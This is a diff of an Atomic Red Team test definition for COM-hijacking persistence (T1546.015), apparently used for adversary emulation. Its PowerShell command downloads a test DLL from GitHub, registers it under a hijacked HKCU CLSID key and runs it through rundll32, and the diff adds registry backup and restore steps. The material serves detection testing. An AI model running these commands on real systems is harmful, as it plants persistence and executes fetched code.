@@ -16,24 +16,29 @@
         command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll"; fi; New-Item
-          -Path ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}''
-          -Value ''MSAA AccPropServices''; New-Item -Path ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32''
-          -Value "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll"; New-ItemProperty
-          -Path ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32''
-          -Name ''ThreadingModel'' -Value ''Apartment'' -PropertyType "String"; Start-Process
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll"; fi; $clsidKey
+          = ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'';
+          $inprocKey = "$clsidKey\InprocServer32"; $regPath = "HKCU\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}";
+          $backupFile = "$env:TEMP\T1546.015_com_hijack_backup.reg"; Remove-Item $backupFile
+          -Force -ErrorAction Ignore; if (Test-Path $clsidKey) { reg export "$regPath"
+          "$backupFile" /y | Out-Null }; New-Item -Path $clsidKey -Value ''MSAA AccPropServices''
+          -Force | Out-Null; New-Item -Path $inprocKey -Value "PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll"
+          -Force | Out-Null; New-ItemProperty -Path $inprocKey -Name ''ThreadingModel''
+          -Value ''Apartment'' -PropertyType "String" -Force | Out-Null; Start-Process
           -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList ''-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'''
-        cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse
-          -ErrorAction Ignore
+        cleanup: $regPath = "HKCU\SOFTWARE\Classes\CLSID\#{clsid}"; $backupFile =
+          "$env:TEMP\T1546.015_com_hijack_backup.reg"; reg delete "$regPath" /f 2>&1
+          | Out-Null; if (Test-Path $backupFile) {; reg import "$backupFile" 2>&1
+          | Out-Null; Remove-Item $backupFile -Force -ErrorAction Ignore; }
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - persistence
-  - atomic-red-team
   - t1546.015
+  - atomic-red-team
+  - persistence
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -65,4 +70,4 @@
         '
     technique_created: '2020-03-16T14:12:47.923Z'
     atomic_guid: 48117158-d7be-441b-bc6a-d9e36e47b52b
-    import_timestamp: '2026-09-04T06:56:11.728793Z'
+    import_timestamp: '2026-09-05T06:41:05.928596Z'
